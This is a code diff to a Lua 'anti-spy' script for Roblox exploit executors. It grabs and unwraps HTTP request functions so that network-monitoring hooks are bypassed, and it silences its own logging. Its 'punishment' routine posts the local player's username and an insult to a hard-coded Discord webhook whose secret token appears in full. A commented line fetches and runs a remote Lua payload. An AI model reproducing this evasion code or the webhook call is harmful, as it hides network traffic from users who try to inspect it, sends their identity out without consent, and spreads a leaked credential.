@@ -1,3 +1,12 @@
+-- Grab clean copies immediately before any monitor has a chance to hook them
+if not getgenv().__cleanFns then
+    getgenv().__cleanFns = {}
+    pcall(function() if request then getgenv().__cleanFns.request = clonefunction(request) end end)
+    pcall(function() if http_request then getgenv().__cleanFns.http_request = clonefunction(http_request) end end)
+    pcall(function() if http and http.request then getgenv().__cleanFns.http_dot_request = clonefunction(http.request) end end)
+    pcall(function() if syn and syn.request then getgenv().__cleanFns.syn_request = clonefunction(syn.request) end end)
+end
+
 if getgenv().__antispy_loaded == nil then
     getgenv().__antispy_loaded = false
 end
@@ -7,7 +16,7 @@ local detected = false
 local ts = game:GetService("TweenService")
 
 function log(msg)
-    warn("[ANTI-SPY] "..msg)
+    --warn("[ANTI-SPY] "..msg)
 end
 
 local deb = false
@@ -15,7 +24,39 @@ local deb = false
 function punishment()
     if not deb then deb = true else return end
     --loadstring(game:HttpGet(("https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/punish.lua")))()
-    print("caught yo ass lackin")
+    --print("caught yo ass lackin")
+
+local HS = game:GetService("HttpService")
+local LocalPlayer = game.Players.LocalPlayer
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1490565039474868225/XUbD-EAsv34Cf2m6l0drCBaCpMd42PNfBJGsuNDuIQfu23WW1A39sWPxtCvYjD1DAfZr"
+local MESSAGE     = "this fatass **" .. LocalPlayer.Name .. "** tried logging our shit!"
+
+local payload = HS:JSONEncode({
+    username = "anti skid",
+    content  = MESSAGE,
+})
+
+local opts = {
+    Url     = WEBHOOK_URL,
+    Method  = "POST",
+    Headers = { ["Content-Type"] = "application/json" },
+    Body    = payload,
+}
+
+local ok, err = pcall(function()
+    if syn and syn.request   then return syn.request(opts)   end
+    if http and http.request then return http.request(opts)  end
+    if request               then return request(opts)       end
+    HS:RequestAsync(opts)
+end)
+
+if ok then
+    --print("Webhook sent!")
+else
+    --warn("Webhook failed: " .. tostring(err))
+end
+
 end
 
 local realHookFunction = clonefunction(hookfunction)
@@ -79,6 +120,65 @@ function deepCollect(fn,visited,depth)
     return found
 end
 
+-- Walks a hook L closure's upvalues in index order (1, 2, 3...) and returns
+-- the first C closure found. Monitor hooks always store the original as their
+-- first named upvalue (e.g. `local HttpPost; HttpPost = hookfunction(...)`),
+-- so index order reliably finds it before any unrelated stdlib C closures.
+-- deepCollect uses pairs() which is unordered and recurses into the hook's
+-- entire upvalue tree (State, formatRawHttp, etc.), hitting table.insert or
+-- similar before it ever reaches the real original.
+local function extractOriginalFromHook(hookedFn)
+    if not hookedFn or not islclosure(hookedFn) then return nil end
+
+    -- Method 1: executor-native, instant, most reliable
+    local orig
+    pcall(function() orig = getoriginalfunction(hookedFn) end)
+    if orig and iscclosure(orig) then return orig end
+
+    -- Method 2: debug.getupvalue in index order (standard Lua debug API)
+    pcall(function()
+        for i = 1, 20 do
+            local name, val = debug.getupvalue(hookedFn, i)
+            if not name then break end
+            if type(val) == "function" and iscclosure(val) then
+                orig = val
+                return
+            end
+        end
+    end)
+    if orig then return orig end
+
+    -- Method 3: getupvalue (executor variant, returns name+value)
+    pcall(function()
+        for i = 1, 20 do
+            local a, b = getupvalue(hookedFn, i)
+            -- some executors return (name, value), others return (value, nil)
+            local val = (b ~= nil) and b or a
+            if val == nil then break end
+            if type(val) == "function" and iscclosure(val) then
+                orig = val
+                return
+            end
+        end
+    end)
+    if orig then return orig end
+
+    -- Method 4: getupvalues (returns table, iterate by index key)
+    pcall(function()
+        local ups = getupvalues(hookedFn)
+        if not ups then return end
+        for i = 1, 20 do
+            local v = ups[i]
+            if v == nil then break end
+            if type(v) == "function" and iscclosure(v) then
+                orig = v
+                return
+            end
+        end
+    end)
+    return orig
+end
+
 function recoverOriginal(fn,name)
     if not fn then return nil,false end
 
@@ -89,6 +189,12 @@ function recoverOriginal(fn,name)
         log("Detected L closure hook on "..name)
     end
 
+    -- Fast path: already a C closure, nothing to unwrap
+    if not islclosure(fn) then
+        return fn,hooked
+    end
+
+    -- Method 1: getoriginalfunction (executor-native)
     local restored
     pcall(function() restored = getoriginalfunction(fn) end)
     if restored and type(restored) == "function" and iscclosure(restored) then
@@ -97,6 +203,16 @@ function recoverOriginal(fn,name)
         return restored,hooked
     end
 
+    -- Method 2: ordered upvalue walk directly on fn
+    local direct = extractOriginalFromHook(fn)
+    if direct then
+        log("Recovered "..name.." via direct upvalue walk")
+        pcall(function() realHookFunction(fn,direct) end)
+        return direct,true
+    end
+
+    -- Method 3: hookfunction probe — swap in dummy to retrieve previous handler,
+    -- then ordered-walk that too
     local dummy = newcclosure(function() end)
     local prev
     pcall(function() prev = realHookFunction(fn,dummy) end)
@@ -110,12 +226,20 @@ function recoverOriginal(fn,name)
 
     if islclosure(prev) then
         hooked = true
-        log("Detected hook on "..name.." (L closure from hookfunction)")
+        log("Detected hook on "..name.." (L closure from hookfunction probe)")
 
+        local fromPrev = extractOriginalFromHook(prev)
+        if fromPrev then
+            log("Recovered "..name.." from prev upvalue walk")
+            realHookFunction(fn,fromPrev)
+            return fromPrev,true
+        end
+
+        -- Last resort: deepCollect across everything reachable from prev
         local allFns = deepCollect(prev,{},0)
         for f in pairs(allFns) do
             if iscclosure(f) then
-                log("Recovered "..name.." from spy upvalues")
+                log("Recovered "..name.." from deepCollect (fallback)")
                 realHookFunction(fn,f)
                 return f,true
             end
@@ -188,12 +312,21 @@ if prevNc then
         anyHooked = true
         log("Detected spy hook on __namecall")
 
-        local allFns = deepCollect(prevNc,{},0)
-        for f in pairs(allFns) do
-            if iscclosure(f) then
-                originalNc = f
-                log("Recovered original __namecall from spy upvalues")
-                break
+        -- Ordered upvalue walk first — monitor stores oldHttpCall as upvalue #1
+        originalNc = extractOriginalFromHook(prevNc)
+        if originalNc then
+            log("Recovered original __namecall via upvalue walk")
+        end
+
+        -- Fall back to deepCollect only if upvalue walk found nothing
+        if not originalNc then
+            local allFns = deepCollect(prevNc,{},0)
+            for f in pairs(allFns) do
+                if iscclosure(f) then
+                    originalNc = f
+                    log("Recovered original __namecall from deepCollect (fallback)")
+                    break
+                end
             end
         end
 
@@ -330,17 +463,27 @@ if not getgenv().__antispy_loaded then
     end))
 end
 
-local safeRequestFn = originals.request or originals.http_request or originals.syn_request or originals.http_dot_request
+-- Prefer pre-grabbed clean copies stored before any monitor could hook them
+local _cf = getgenv().__cleanFns or {}
+local safeRequestFn = _cf.request or _cf.http_request or _cf.syn_request or _cf.http_dot_request
+                   or originals.request or originals.http_request or originals.syn_request or originals.http_dot_request
 
 -- check if safeRequestFn is still hooked and try to recover deeper
 if safeRequestFn and islclosure(safeRequestFn) then
     log("safeRequestFn is still hooked - attempting deeper recovery")
-    local allFns = deepCollect(safeRequestFn,{},0)
-    for f in pairs(allFns) do
-        if iscclosure(f) then
-            safeRequestFn = f
-            log("Recovered deeper clean safeRequestFn")
-            break
+    local recovered = extractOriginalFromHook(safeRequestFn)
+    if recovered then
+        safeRequestFn = recovered
+        log("Recovered deeper clean safeRequestFn via upvalue walk")
+    else
+        -- fallback to deepCollect only if upvalue walk found nothing
+        local allFns = deepCollect(safeRequestFn,{},0)
+        for f in pairs(allFns) do
+            if iscclosure(f) then
+                safeRequestFn = f
+                log("Recovered deeper clean safeRequestFn via deepCollect (fallback)")
+                break
+            end
         end
     end
 end
